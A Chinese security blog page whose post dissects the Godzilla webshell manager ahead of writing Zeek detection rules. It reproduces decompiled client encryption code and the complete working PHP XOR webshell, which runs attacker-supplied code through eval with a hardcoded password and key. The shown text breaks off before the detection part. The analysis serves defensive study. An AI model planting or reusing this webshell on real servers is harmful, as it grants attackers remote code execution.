<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{&quot;hostname&quot;:&quot;example.com&quot;,&quot;root&quot;:&quot;&#x2F;&quot;,&quot;images&quot;:&quot;&#x2F;images&quot;,&quot;scheme&quot;:&quot;Mist&quot;,&quot;version&quot;:&quot;8.4.0&quot;,&quot;exturl&quot;:false,&quot;sidebar&quot;:{&quot;position&quot;:&quot;left&quot;,&quot;display&quot;:&quot;post&quot;,&quot;padding&quot;:18,&quot;offset&quot;:12},&quot;copycode&quot;:true,&quot;bookmark&quot;:{&quot;enable&quot;:false,&quot;color&quot;:&quot;#222&quot;,&quot;save&quot;:&quot;auto&quot;},&quot;fancybox&quot;:false,&quot;mediumzoom&quot;:false,&quot;lazyload&quot;:false,&quot;pangu&quot;:false,&quot;comments&quot;:{&quot;style&quot;:&quot;tabs&quot;,&quot;active&quot;:null,&quot;storage&quot;:true,&quot;lazyload&quot;:false,&quot;nav&quot;:null},&quot;motion&quot;:{&quot;enable&quot;:true,&quot;async&quot;:false,&quot;transition&quot;:{&quot;post_block&quot;:&quot;fadeIn&quot;,&quot;post_header&quot;:&quot;fadeInDown&quot;,&quot;post_body&quot;:&quot;fadeInDown&quot;,&quot;coll_header&quot;:&quot;fadeInLeft&quot;,&quot;sidebar&quot;:&quot;fadeInUp&quot;}},&quot;prism&quot;:false,&quot;i18n&quot;:{&quot;placeholder&quot;:&quot;搜索...&quot;,&quot;empty&quot;:&quot;没有找到任何搜索结果：${query}&quot;,&quot;hits_time&quot;:&quot;找到 ${hits} 个搜索结果（用时 ${time} 毫秒）&quot;,&quot;hits&quot;:&quot;找到 ${hits} 个搜索结果&quot;},&quot;path&quot;:&quot;&#x2F;search.xml&quot;,&quot;localsearch&quot;:{&quot;enable&quot;:true,&quot;trigger&quot;:&quot;auto&quot;,&quot;top_n_per_article&quot;:1,&quot;unescape&quot;:false,&quot;preload&quot;:false}}</script>
<meta name="description" content="一个热爱健身的安全分析师">
<meta property="og:type" content="website">
<meta property="og:title" content="Canon&#39;s Blog">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Canon&#39;s Blog">
<meta property="og:description" content="一个热爱健身的安全分析师">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Canon">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/page/2/">



<script class="next-config" data-name="page" type="application/json">{&quot;sidebar&quot;:&quot;&quot;,&quot;isHome&quot;:true,&quot;isPost&quot;:false,&quot;lang&quot;:&quot;zh-CN&quot;,&quot;comments&quot;:&quot;&quot;,&quot;permalink&quot;:&quot;&quot;,&quot;path&quot;:&quot;page&#x2F;2&#x2F;index.html&quot;,&quot;title&quot;:&quot;&quot;}</script>

<script class="next-config" data-name="calendar" type="application/json">&quot;&quot;</script>
<title>Canon's Blog</title><script src="/js/config.js"></script>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Canon's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Canon</p>
  <div class="site-description" itemprop="description">一个热爱健身的安全分析师</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">35</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">19</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/30/Zeek-Detect-Godzilla-WebShell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="一个热爱健身的安全分析师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/30/Zeek-Detect-Godzilla-WebShell/" class="post-title-link" itemprop="url">Zeek - Detect Godzilla WebShell</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-11-30 15:45:58" itemprop="dateCreated datePublished" datetime="2021-11-30T15:45:58+08:00">2021-11-30</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2023-06-21 00:47:42" itemprop="dateModified" datetime="2023-06-21T00:47:42+08:00">2023-06-21</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/NTA/" itemprop="url" rel="index"><span itemprop="name">NTA</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>13k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>12 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><strong>Godzilla（哥斯拉）：</strong></p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Godzilla.png" alt="image-20211211235918877"></p>
<p>​    身高：50米</p>
<p>​    体重：2万吨</p>
<p>​    攻击方式：放射热线、白热光、袋鼠踢、投掷、搏击、尾鞭</p>
<p>​    一种生活在侏罗纪和白垩纪之间的罕见海栖爬虫类和陆生兽类的中间形态生物的残存个体，因氢弹试验的影响而出现。最初在太平洋上出现并袭击货船，后经大户岛在东京登陆，造成巨大破坏。最终在东京湾被芹泽博士发明的水中氧气破坏素（核能氧气素/氧气破坏者）杀死。</p>
<p>​    以下文章将简述如何捕获该怪兽，首先派大量直升机去恶魔岛劫持另一体型巨大但温和许多的巨兽：金刚。然后让金刚抗伤害人类偷袭就好。<strong>本篇完！</strong></p>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/Kong.webp" alt="image-20211211235918877"></p>
<p><strong>实在编不下去了，来点正经的吧。。。</strong></p>
<hr>
<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla"><strong>Godzilla</strong></a>（哥斯拉）是一款优秀的WebShell权限管理工具，其特点有：</p>
<ul>
<li><p>哥斯拉全部类型的Shell均过市面所有静态查杀</p>
</li>
<li><p>哥斯拉流量加密过市面全部流量WAF</p>
</li>
<li><p>哥斯拉的自带的插件是冰蝎、蚁剑不能比拟的</p>
</li>
</ul>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/zeek/zeek">Zeek</a></strong> （原名：Bro） 是一个开源的网络流量分析器。许多运营商将Zeek作为网络安全监控器（NSM），支持对可疑或恶意活动的调查。Zeek还支持安全领域以外的广泛的流量分析任务，包括性能测量和故障排除。其特点有：</p>
<ul>
<li><p>深度分析：Zeek带有许多协议的分析器，可以在应用层进行高级语义分析。</p>
</li>
<li><p>适应性和灵活性：Zeek的特定领域脚本语言可以实现特定地点的监控策略，这意味着它不受限于任何特定的检测方法。</p>
</li>
<li><p>高效：Zeek以高性能网络为目标，在各种大型网站上运行。</p>
</li>
<li><p>高度的状态性：Zeek对其监控的网络保持广泛的应用层状态，并提供网络活动的高级档案。</p>
</li>
</ul>
<p><strong>环境</strong></p>
<ul>
<li>Godzilla： v4.0.1</li>
<li>Zeek：v4.1.0</li>
<li>WebShell：<ul>
<li>PHP XOR BASE64</li>
<li>JSP AES BASE64</li>
</ul>
</li>
</ul>
<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="PHP-XOR-BASE64"><a href="#PHP-XOR-BASE64" class="headerlink" title="PHP XOR BASE64"></a>PHP XOR BASE64</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><ul>
<li>基础配置：URL、密码、密钥、加密器等信息。如下图所示：<ul>
<li>密码：和蚁剑、菜刀一样，密码就是POST请求中的参数名称。例如，在本例中密码为<code>Happy</code>，那么Godzilla提交的每个请求都是<code>Happy=XXX</code>这种形式。以下称为<strong>pass</strong></li>
<li>密钥：用于对请求数据进行加密，不过加密过程中并非直接使用密钥明文，而是计算密钥的MD5值，然后取其前16位用于加密。以下为称为<strong>key</strong></li>
<li>有效载荷：生成对应类型的WebShell</li>
<li>加密器：控制WebShell的加密方式</li>
<li>请求配置：主要用于自定义HTTP请求头，以及在最终的请求数据前后额外再追加一些扰乱数据，进一步降低流量的特征</li>
</ul>
</li>
</ul>
<p><img src="/2021/11/30/Zeek-Detect-Godzilla-WebShell/%E5%AE%A2%E6%88%B7%E7%AB%AF.png" alt="image-20211130173607606"></p>
<ul>
<li><p>由于Godzilla的源码作者并未做混淆，所以通过<a target="_blank" rel="noopener" href="https://github.com/skylot/jadx"><strong>jadx</strong></a>工具很方便就能得到源码。</p>
<p>对于<strong>PHP XOR BASE64</strong>加密方式来说，首位各附加了<strong>16位</strong>的校验字符串（<strong>pass</strong> + <strong>key</strong> 计算的<strong>MD5</strong>值）。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PhpXor</span> <span class="keyword">implements</span> <span class="title">Cryption</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ShellEntity context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.shell = context;</span><br><span class="line">        <span class="keyword">this</span>.http = <span class="keyword">this</span>.shell.getHttp();</span><br><span class="line">        <span class="keyword">this</span>.key = <span class="keyword">this</span>.shell.getSecretKeyX().getBytes();</span><br><span class="line">        <span class="keyword">this</span>.pass = <span class="keyword">this</span>.shell.getPassword();</span><br><span class="line">        String findStrMd5 = functions.md5(<span class="keyword">this</span>.pass + <span class="keyword">new</span> String(<span class="keyword">this</span>.key));	<span class="comment">// 校验字符串</span></span><br><span class="line">        <span class="keyword">this</span>.findStrLeft = findStrMd5.substring(<span class="number">0</span>, <span class="number">16</span>);												<span class="comment">// 前16位MD5</span></span><br><span class="line">        <span class="keyword">this</span>.findStrRight = findStrMd5.substring(<span class="number">16</span>);													<span class="comment">// 后16位MD5</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>请求加密<ul>
<li>对于明文数据使用<strong>key</strong>进行按位异或-&gt;base64编码-&gt;url编码，实现数据加密；</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> E(data);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          Log.error(e);</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过key按位异或</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">byte</span>[] E(<span class="keyword">byte</span>[] cs) &#123;</span><br><span class="line">      <span class="keyword">int</span> len = cs.length;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">          cs[i] = (<span class="keyword">byte</span>) (cs[i] ^ <span class="keyword">this</span>.key[(i + <span class="number">1</span>) &amp; <span class="number">15</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">this</span>.pass + <span class="string">&quot;=&quot;</span> + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>响应解密</p>
<ul>
<li><p>首先调用<code>findStr</code>方法删除响应数据中的前后16位校验字符串；</p>
</li>
<li><p>然后利用<code>base64Decode</code>方法解码字符串；</p>
</li>
<li><p>最后使用<strong>key</strong>按位异或，实现数据解密；</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="keyword">null</span> || data.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> D(findStr(data));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] D(String data) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] cs = functions.base64Decode(data);</span><br><span class="line">    <span class="keyword">int</span> len = cs.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        cs[i] = (<span class="keyword">byte</span>) (cs[i] ^ <span class="keyword">this</span>.key[(i + <span class="number">1</span>) &amp; <span class="number">15</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cs;</span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">findStr</span><span class="params">(<span class="keyword">byte</span>[] respResult)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> functions.subMiddleStr(<span class="keyword">new</span> String(respResult), <span class="keyword">this</span>.findStrLeft, <span class="keyword">this</span>.findStrRight);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>演示数据 - 数据解密</strong></p>
<p>![image-20211201143236656](./Zeek-Detect-Godzilla-WebShell/示例数据 - 1.png)</p>
<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>​    <strong>PHP XOR BASE64</strong> 类型的加密Shell的服务器端代码如下，其中定义了<code>encode</code>函数，用于加密或解密请求数据。由于是通过按位异或实现的加密，所以<code>encode</code>函数即可用于加密，同时也可用于解密。整个Shell的基本执行流程是：服务器接收到Godzilla发送的第一个请求后，由于此时尚未建立session，所以将POST请求数据解密后（得到的内容为Shell操作中所需要用到的相关<code>php</code>函数定义代码）存入session中，后续Godzilla只会提交相关操作对应的函数名称（如获取目录中的文件列表对应的函数为<code>getFile</code>）和相关参数，这样哥斯拉的相关操作就不需要发送大量的请求数据。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;Happy&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;bdf2e45b317c4585&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=encode(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JSP-AES-BASE64"><a href="#JSP-AES-BASE64" class="headerlink" title="JSP AES BASE64"></a>JSP AES BASE64</h2><p>​    JSP WebShell 则采用了AES加密形式，AES加密的key。同样是计算密钥的MD5值，然后取其前16位用于加密。更深入的分析大家可以去参考，这并不是本文的重点。**<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/285693.html">【原创】哥斯拉Godzilla加密流量分析</a>**</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ShellEntity context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.shell = context;</span><br><span class="line">    <span class="keyword">this</span>.http = <span class="keyword">this</span>.shell.getHttp();</span><br><span class="line">    <span class="keyword">this</span>.key = <span class="keyword">this</span>.shell.getSecretKeyX();</span><br><span class="line">    <span class="keyword">this</span>.pass = <span class="keyword">this</span>.shell.getPassword();</span><br><span class="line">    String findStrMd5 = functions.md5(<span class="keyword">this</span>.pass + <span class="keyword">this</span>.key);</span><br><span class="line">    <span class="keyword">this</span>.findStrLeft = findStrMd5.substring(<span class="number">0</span>, <span class="number">16</span>).toUpperCase();</span><br><span class="line">    <span class="keyword">this</span>.findStrRight = findStrMd5.substring(<span class="number">16</span>).toUpperCase();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.encodeCipher = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.decodeCipher = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.encodeCipher.init(<span class="number">1</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.key.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.decodeCipher.init(<span class="number">2</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.key.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.payload = <span class="keyword">this</span>.shell.getPayloadModule().getPayload();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.payload != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.http.sendHttpResponse(<span class="keyword">this</span>.payload);</span><br><span class="line">            <span class="keyword">this</span>.state = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Log.error(<span class="string">&quot;payload Is Null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] encode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.pass + <span class="string">&quot;=&quot;</span> + URLEncoder.encode(functions.base64EncodeToString(<span class="keyword">this</span>.encodeCipher.doFinal(data)))).getBytes();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] decode(<span class="keyword">byte</span>[] data) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeCipher.doFinal(functions.base64Decode(findStr(data)));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.error(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



